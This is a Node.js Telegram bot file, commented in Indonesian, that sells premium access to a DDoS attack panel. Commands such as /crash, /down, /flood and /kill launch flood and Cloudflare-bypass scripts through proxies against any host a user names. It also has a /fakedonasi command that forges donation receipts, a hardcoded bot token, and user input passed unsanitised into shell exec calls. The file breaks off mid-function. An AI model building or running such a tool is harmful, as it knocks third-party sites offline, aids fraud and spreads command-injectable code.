/*

Created By : RelixOfficial
Base Script By : GhostMods

 Dilarang Menghapus Credit
  JANGAN Menjualnya Terlalu Murah Atau gratis❗❗
*/
const TelegramBot = require('node-telegram-bot-api');
const request = require('request');
const axios = require('axios');
const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');
const express = require('express');
const fs = require('fs');
const execSync = require('child_process').execSync;
const { exec } = require('child_process');
const { createNewBot } = require('./cloneBot'); 
const {
    message,
    editedMessage,
    channelPost,
    editedChannelPost,
    callbackQuery
} = require("telegraf/filters");

try {
    
    const cloudscraper = require('cloudscraper');
    const useragents = require('user-agents');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm install child_process && npm install cloudscraper && npm install randomstring user-agents');
    console.log('Done.');
    process.exit();
}

const token = '7165878163:AAE0GBsIRpxq65zlB4rDfyAxehsfnvUWmCo';
const bot = new TelegramBot(token, {polling: true});
const adminId = '5987304194'; // ID admin, ganti dengan 
const premiumUserDB = './premiumUsers.json';

function restart() {
process.exit();
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  // Mengambil data dari file JSON
  const rawData = fs.readFileSync(premiumUserDB);
  const premiumUsers = JSON.parse(rawData);

  if (premiumUsers.includes(userId)) {
    return true; // Pengguna adalah pengguna premium
  } else {
    return false; // Pengguna adalah non-premium
  }
}

function loading(chatId, durationInMinutes) {
  // Kirim pesan awal
  bot.sendMessage(chatId, '.').then((sentMessage) => {
    const messageId = sentMessage.message_id; // Mendapatkan message_id
    let counter = 0;

    // Array untuk menyimpan urutan loading
    const loadingSteps = [
      "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
      "《 █████▒▒▒▒▒▒▒》40%",
      "《 ████████▒▒▒▒》65%",
      "《 ██████████▒▒》80%",
      "《 ████████████》100%"
    ];

    const totalDurationMs = durationInMinutes;
    const intervalMs = 500; 
    const totalSteps = totalDurationMs / intervalMs;
    
    const intervalId = setInterval(() => {
      if (counter < totalSteps) {
        const currentStep = loadingSteps[counter % loadingSteps.length];
        bot.editMessageText(`${currentStep}`, {
          chat_id: chatId,
          message_id: messageId
        }).catch((error) => {
          console.error('Error editing message:', error);
        });
        counter++;
      } else {
        clearInterval(intervalId);
        bot.editMessageText('Proses selesai!', {
          chat_id: chatId,
          message_id: messageId
        }).catch((error) => {
          console.error('Error editing message:', error);
        });
      }
    }, intervalMs); // Update pesan setiap 0.8 detik
  }).catch((error) => {
    console.error('Error sending message:', error);
  });
}

// Load premium users from database
if (fs.existsSync(premiumUserDB)) {
  const data = fs.readFileSync(premiumUserDB);
  premiumUsers = JSON.parse(data);
}

// Function to save premium users to database
const savePremiumUsers = () => {
  fs.writeFileSync(premiumUserDB, JSON.stringify(premiumUsers));
}

// Function to check if user is admin
const isAdmin = (userId) => {
  return userId.toString() === adminId;
}

// Function to add premium user
const addPremiumUser = (userId) => {
  premiumUsers.push(userId);
  savePremiumUsers();
}

// Function to remove premium user
const removePremiumUser = (userId) => {
  const index = premiumUsers.indexOf(userId);
  if (index > -1) {
    premiumUsers.splice(index, 1);
    savePremiumUsers();
  }
}

// Command: /addprem iduser
bot.onText(/\/addprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    addPremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ID ${userId} Berhasil Di Tambahkan Kedalam Pengguna Premium.\nHarap Restart Panel Setelah Melakukan /addprem.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can add premium users.');
  }
});

// Command: /delprem iduser
bot.onText(/\/delprem (.+)/, (msg, match) => {
  const userId = match[1];
  if (isAdmin(msg.from.id)) {
    removePremiumUser(userId);
    bot.sendMessage(msg.chat.id, `User ${userId} has been removed from premium users.`);
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can remove premium users.');
  }
});

bot.onText(/\/restart/, async (msg, match) => {
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, `Waiting For Restart.`);
    await delay(3000);
    restart();
  } else {
    bot.sendMessage(msg.chat.id, 'Only admin can restart the server.');
  }
});

const clonedBots = []; // Array untuk menyimpan bot clone

bot.onText(/\/clonebot (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const botToken = match[1]; // Ambil token dari pesan
      if (isAdmin(msg.from.id)) {
    if (createNewBot(botToken, clonedBots)) {
        bot.sendMessage(chatId, 'Bot baru berhasil di-clone dan sekarang aktif!');
    } else {
        bot.sendMessage(chatId, 'Gagal mengaktifkan bot baru. Token mungkin tidak valid.');
    }
     } else {
    bot.sendMessage(msg.chat.id, 'Only admin.');
  }
});




// Menampilkan menu bot 
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id; 
  bot.sendMessage(chatId, "🤖 *BERIKUT MENU BOT* 🤖\n\n" +
    "/help - bantuan tentang bot ℹ️\n" +
    "/ddos - Munculkan Menu DDoS🔪\n"+
    "/tools - Munculkan Menu Tools🛠️\n" +
    "/donasi - support pengguna bot 🎗️\n" +
    "/myprem - cek Premium 🌟\n" +
    "/cekprem <id> - cek Premium pengguna lain ⭐️\n" +
    "/clear - Membersihkan bot 🧹\n\n" +
    "👤 *Fitur Admin* 👤\n" +
    "/restart - melakukan restart panel⏳\n" +
    "/addprem <id> - Menambahkan pengguna prem🔖\n" +
    "/delprem <id> - menghapus status premium 🚫\n" +
    "/clonebot - untuk mengcloning bot 🤖\n\n" +
    "🔥 *BERIKUT MENU KAMI, MAU BELI SC BOT TEKAN BUTTON DIBAWAH* 🔥",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '👑 OWNER 👑', url: 'https://t.me/Oficiallz' }
          ],
          [
            { text: '🛒 BELI PREMIUM 🛒', url: 'https://t.me/Oficiallz' }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});
//menu ddos
bot.onText(/\/ddos/, (msg) => {
  const chatId = msg.chat.id;

  // Menampilkan menu bot
  bot.sendMessage(chatId, "🤖 BERIKUT MENU DDOS 🤖\n\n" +
   "🌟 BIG DDOS FITUR 🌟\n" +
    "/down - <Host> <Time>\n" +
    "/tlsvip - <Host> <Time>\n" +
    "/crash - <Host> <Time>\n\n" +
    "🔪 MEDIUM DDOS FITUR 🔪\n" +
    "/pidoras - <Host> <Time>\n" +
    "/bypass - <Host> <Time>\n" +
    "/flood - <Host> <Time>\n" +
    "/glory - <Host> <Time>\n" +
    "/kill - <Host> <Time>\n" +
    "/tools - Tools pengecekan\n\n" +
    "👤 Fitur Admin 👤\n" +
    "/restart - melakukan restart panel⏳\n" +
    "/addprem <id> - Menambahkan pengguna prem🔖\n" +
    "/delprem <id> - menghapus status premium 🚫\n" +
    "/clonebot - untuk mengcloning bot 🤖\n\n" +
    "🔥 BERIKUT MENU KAMI, MAU BUY SC BOT TEKAN BUTTON DIBAWAH 🔥",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '👑 OWNER 👑', url: 'https://t.me/Oficiallz' }
          ],
          [
            { text: '🛒 BELI PREMIUM 🛒', url: 'https://t.me/Oficiallz' }
        ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});

// Menampilkan menu bot 
bot.onText(/\/tools/, (msg) => {
  const chatId = msg.chat.id; 
  bot.sendMessage(chatId, "🤖 *BERIKUT MENU BOT* 🤖\n\n" +
    "/donasi - support owner bot️\n" +
    "/uagen <jumlah> - membuat user-agent\n" +
    "/ping <host> - mengecek ping host\n" +
    "/http <host> - mengecek host\n" +
    "/dns <host> - Mengecek dns host\n" +
    "/myprem - cek Premium\n" +
    "/cekprem <id> - cek Premium pengguna lain\n" +
    "/fakedonasi <Nama> <gmail> <uang> <pesan> <lanjut> - membuat fake donasi\n\n" +
    "👤 *Fitur Admin* 👤\n" +
    "/restart - melakukan restart panel⏳\n" +
    "/addprem <id> - Menambahkan pengguna prem🔖\n" +
    "/delprem <id> - menghapus status premium 🚫\n" +
   "/clonebot - untuk mengcloning bot 🤖\n" +
    "🔥 *BERIKUT MENU KAMI, MAU BELI SC BOT TEKAN BUTTON DIBAWAH* 🔥",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '👑 OWNER 👑', url: 'https://t.me/Oficiallz' }
          ],
          [
            { text: '🛒 BELI PREMIUM 🛒', url: 'https://t.me/Oficiallz' }
        ]
         ]
      },
      parse_mode: "Markdown"
    }
  );
});

//menu addprem

// Event handling untuk perintah /myprem
bot.onText(/\/myprem/, (msg) => {
    try {
        const data = fs.readFileSync('premiumUsers.json', 'utf8');
        const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

        if (premiumUsers.has(msg.from.id.toString())) {
            bot.sendMessage(msg.chat.id, '🎉🥳 Selamat datang, ' + (msg.from.username || 'Unknown') + '! 🥳🎉\nKami dengan senang hati ingin memberikan sambutan khusus untuk Anda sebagai anggota premium kami. 🌟✨\n\nSebagai anggota premium, Anda akan menikmati berbagai keuntungan eksklusif yang tidak akan didapatkan oleh anggota non premium. 🎁💎 Dapatkan akses penuh ke konten premium kami, diskon khusus, layanan pelanggan prioritas, dan masih banyak lagi! 💯\n\nKami sangat berterima kasih atas kepercayaan dan dukungan Anda sebagai anggota premium. Kami berharap Anda dapat merasakan pengalaman yang luar biasa bersama kami. 🙏🤩\n\nJangan lupa untuk terus mengikuti kami di sini dan di @Oficiallz untuk mendapatkan informasi terbaru, penawaran eksklusif, dan kesempatan menarik lainnya! 📲✉️', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/Oficiallz'
                        }]
                    ]
                }
            });
        } else {
            bot.sendMessage(msg.chat.id, 'Hallo ' + (msg.from.username || 'Unknown') + '\nJika Anda belum menjadi anggota premium, jangan khawatir! Anda juga dapat menikmati pengalaman yang luar biasa dengan mengupgrade ke keanggotaan premium kami. Silakan hubungi @Oficiallz untuk informasi lebih lanjut. 💼💰\nTerima kasih atas perhatian dan selamat bergabung dengan komunitas premium kami! 🎊🙌\n\n#PremiumMember #ExclusiveExperience #JoinTheCommunity', {
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: 'Beli Premium',
                            url: 'https://t.me/Oficiallz'
                        }]
                    ]
                }
            });
        }
    } catch (err) {
        console.error('Error reading premiumUsers data', err.message);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat memeriksa status premium.');
    }
});

// Fungsi untuk menyimpan data premiumUsers ke dalam file JSON
function savePremiumUsersToFile(data) {
    fs.writeFile('premiumUsers.json', JSON.stringify(Array.from(data)), 'utf8', (err) => {
        if (err) {
            console.error('Error writing premiumUsers data', err.message);
        }
    });
}

// Inisialisasi bot
const MAX_MESSAGES_BEFORE_CLEAR_PROMPT = 15;
let messageCount = 0;

bot.onText(/\/clear/, (msg) => {
  const chatId = msg.chat.id;

  if (messageCount < MAX_MESSAGES_BEFORE_CLEAR_PROMPT) {
    // Menghapus riwayat obrolan bot dengan pengguna
    bot.deleteMessage(chatId, msg.message_id)
      .then(() => {
        messageCount++;
        bot.sendMessage(chatId, 'Riwayat obrolan Anda telah dihapus.');
      })
      .catch((error) => {
        console.error('Error deleting message:', error);
        bot.sendMessage(chatId, 'Maaf, terjadi kesalahan dalam menghapus riwayat obrolan.');
      });
  } else {
    bot.sendMessage(chatId, 'Anda telah menggunakan bot ini sebanyak 15 kali. Mohon bersihkan riwayat chat Anda sendiri untuk melanjutkan penggunaan bot.');
  }
});


// Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
function isPremiumUser(userId) {
  // Mengambil data dari file JSON
  const rawData = fs.readFileSync('premiumUsers.json');
  const premiumUsers = JSON.parse(rawData);

  if (premiumUsers.includes(userId)) {
    return true; // Pengguna adalah pengguna premium
  } else {
    return false; // Pengguna adalah non-premium
  }
}

bot.onText(/\/cekprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const requestedUserId = match[1];

  if (isPremiumUser(requestedUserId)) {
    bot.sendMessage(chatId, 'ID ' + requestedUserId + ' adalah pengguna premium. 🌟🌟🌟');
  } else {
    bot.sendMessage(chatId, 'ID ' + requestedUserId + ' adalah pengguna non-premium❗.');
  }
});

// Fitur /cekid - Cek User ID Telegram Dari Username

//donasi
bot.onText(/\/donasi/, (msg) => {
    const saweriaLink = 'https://sociabuzz.com/adisdzaky';
    const buttonOptions = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'Donasi ke Saya', url: 'https://sociabuzz.com/adisdzaky' }
                ]
            ]
        }
    };
    const donasiMessage = `Terima kasih telah mendukung kami melalui donasi! Jika Anda ingin memberikan donasi, silakan klik button dibawah ini 🤗`;

    bot.sendMessage(msg.chat.id, donasiMessage, buttonOptions);
});

const donasiData = {
    pesan: 'bot BERHASIL NYALA \ud83e\udd17'
};

// Kemudian kirim pesan donasi yang berisi data donasi:
bot.sendMessage(adminId, `NAMA: ${donasiData.namaUser}\nID: ${donasiData.userId}\nNAMA: ${donasiData.username}\nPESAN: ${donasiData.pesan}`);

bot.onText(/\/fakedonasi (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = match[1];
  const gmail = match[2];
  const uang = match[3];
  const pesan = match[4];
  const lanjut = match[5];

  const waktu = new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" });
  const id = generateUUID();

  const donasiMessage = `Donasi Baru Diterima! 🎉\n\nWaktu: ${waktu}\nID: ${id}\nTipe: donation\nTotal: Rp ${uang}\nPotongan: -3750\nNama Pengirim: ${nama}\nEmail Pengirim: ${gmail}\nPesan: ${pesan} ${lanjut}`;

  const keyboard = [
    [{
      text: "Donasi Juga",
      url: "https://sociabuzz.com/adisdzaky"
    }]
  ];

  const messageOptions = {
    reply_markup: JSON.stringify({
      inline_keyboard: keyboard
    })
  };

  bot.sendMessage(chatId, donasiMessage, messageOptions)
    .then(() => {
      bot.sendMessage(chatId, "Pesan donasi berhasil dikirim");
    })
    .catch((error) => {
      bot.sendMessage(chatId, "Gagal mengirim pesan donasi");
    });
});

function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    var r = Math.random() * 16 | 0,
      v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

//menu chekhost
function createButton(text, url) {
  return {
    text: text,
    url: url
  };
}

//menu chekhost
bot.onText(/\/ping (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-ping?host=${web}&`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/http (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/info (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/ip-info?host=${web}`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});

bot.onText(/\/dns (.+)/, (msg, match) => {
  const web = match[1];
  const url = `https://check-host.net/check-dns?host=${web}&csrf_token=`;
  const button = createButton('Click disini', url);
  bot.sendMessage(msg.chat.id, 'Klik link di bawah untuk melihat hasil:', {
    reply_markup: {
      inline_keyboard: [
        [button]
      ]
    }
  });
});


bot.onText(/\/uagen (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const uafile = './method/ua.txt';
      
       bot.sendMessage(chatId, `Success`);
       
      
      exec(`node ./method/uagen.js ${web} ${uafile}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success`);
      });
      
      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });



bot.onText(/\/updateproxy/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      
      
       bot.sendMessage(chatId, `Success`);
       exec(`node ./method/scrape.js`);
       
      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });


//menu crash
try {
  const data = fs.readFileSync('premiumUsers.json', 'utf8');
  const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON
  function isPremiumUser(userId) {
    // Cek apakah userId ada di dalam premiumUsers
    return premiumUsers.has(userId.toString());
    
  }
  
  // menu stop
  bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Hentikan file yang sedang berjalan
    exec("pkill -f CFbypass.js");
    exec("pkill -f TLS-BYPASS.js");
    exec("pkill -f UAM.js");
    exec("pkill -f tls-arz.js");
    exec("pkill -f tlsvip.js");
    exec("pkill -f flood.js");
    exec("pkill -f MIXMAX.js");
    exec("pkill -f Pidoras.js");
    exec("pkill -f Gloryv2.js");
   
    bot.sendMessage(chatId, 'Berhasil menghentikan file yang sedang berjalan.');
  } else {
    bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
  }
});
  
  //menu crash
  bot.onText(/\/crash (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      const req = 5;
      const thread = 10;

      bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
      
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      // Menjalankan script Crash2.js dengan parameter yang diberikan
      exec(`node ./method/TLS-BYPASS.js ${web} ${time} ${req} ${thread}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      // Menjalankan script Crash3.js dengan parameter yang diberikan
     exec(`node ./method/UAM.js ${web} ${time} ${req} ${thread} proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });


  
 bot.onText(/\/down (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];

 bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
 
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      exec(`node ./method/tlsvip.js ${web} ${time} 20 15 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      exec(`node ./method/TLS-BYPASS.js ${web} ${time} 5 10`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });
 
 
  bot.onText(/\/tlsvip (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
        
      exec(`node ./method/tlsvip.js ${web} ${time} 7 15 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      exec(`node ./method/TLS-BYPASS.js ${web} ${time} 9 10`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      exec(`node ./method/tls-arz.js ${web} ${time} 36 9 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });

// ======= [ end super premium method ] ========

bot.onText(/\/pidoras (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      loading(chatId, time);
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
       exec(`node ./method/Pidoras.js ${web} ${time} 10 20 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
       
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });

    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });
  


bot.onText(/\/flood (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      loading(chatId, time);
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
       exec(`node ./method/flood.js ${web} ${time} 64 11 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      
      
      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });
  

bot.onText(/\/bypass (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      loading(chatId, time);
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      
      exec(`node ./method/BOMB.js ${web} ${time} 64 10`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      exec(`node ./method/UAM.js ${web} ${time} 5 9 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });
      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });

bot.onText(/\/glory (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      loading(chatId, time);
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
       exec(`node ./method/Gloryv2.js ${web} ${time} 65 10 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
       
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      

      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });


bot.onText(/\/kill (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      loading(chatId, time);
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
      exec(`node ./method/StarsXKill.js ${web} ${time} 50 20`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      
      exec(`node ./method/UAM.js ${web} ${time} 5 9 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });
      
      
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });



/*bot.onText(/\/tlsvip (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (isPremiumUser(userId)) {
      const web = match[1];
      const time = match[2];
      loading(chatId, time);
      
       bot.sendMessage(chatId, `Success Penyerangan Sedang Berlangsung\n\nTarget: ${web},\nTime: ${time}`);
       
      exec(`node ./method/CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      
      exec(`node ./method/ ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time}`);
      });
      
      
    } else {
